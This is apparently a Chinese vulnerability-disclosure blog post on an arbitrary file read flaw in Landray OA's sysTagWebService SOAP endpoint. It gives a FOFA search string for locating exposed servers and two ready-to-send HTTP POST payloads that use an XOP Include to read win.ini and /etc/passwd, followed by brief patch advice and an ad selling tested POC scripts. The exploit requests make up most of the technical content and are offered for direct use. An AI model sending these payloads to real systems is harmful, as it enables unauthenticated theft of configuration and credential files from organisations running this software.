#  蓝凌OA WebService sysTagWebService 任意文件读取漏洞   
Superhero  nday POC   2025-01-06 09:16  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
蓝凌 OA产品是一款全面的办公 自动化软件系统，旨在为企业提供高效、安全、智能的办公解决方案。产品融合了先进的信息化技术和企业管理理念，通过提供表单、流程、仪表盘、API等功能，帮助企业实现信息的全方位管理和高效利用。无论是中小型企业还是大型跨国公司，都可以通过蓝凌OA产品实现更加高效的运营和管理。核心产品EKP平台定位为新一代数字化生态OA平台，数字化向纵深发展，正加速构建产业互联网，对企业协作能力提出更高要求，蓝凌新一代生态型OA平台能够支撑办公数字化、管理智能化、应用平台化、组织生态化，赋能大中型组织更高效的内外协作与管理，支撑商业模式创新与转型发展。  
**01******  
  
**漏洞概述**  
  
  
蓝凌OA webservice服务 sysTagWebService 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
body="Com_Parameter"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9G1PJg3Yhv35LWfyfzO55DL4edUROcLZ1N0IalKeWF7fbianoQCoWiavw/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
  
windows  
```
POST /sys/webservice/sysTagWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.tag.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getGroups>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getGroups>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9yJ1opwME0WkMTBUS8JYAQBAXw1wo8MiaHOlHQ1olB13zZjiaNrGhS1GA/640?wx_fmt=png&from=appmsg "")  
  
linux  
```
POST /sys/webservice/sysTagWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate
------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.tag.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getGroups>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></count>
        </arg0>
    </web:getGroups>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9DrApUdYwerTrOpev4Rc3LoaR6SKXwA7EavTia5n9oDn1ktJAAvIKicNA/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9B2duZw6foeLicaN3ibbmJdQujR7iaU3eUf2UyRltJB0abdoT9GCOonhqA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9yHQ3sc2S0bFv6ibNrLZOszeu9HP4uSRB2OPVeJxFp7NWDoczTEiceiajw/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD984eTKYMGic54JWkUo5bhX26VfibjDg2SDiaM4t57h1C6ruwJRGY2EEv0Q/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
升级至安全版本或打补丁  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10个左右POC。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
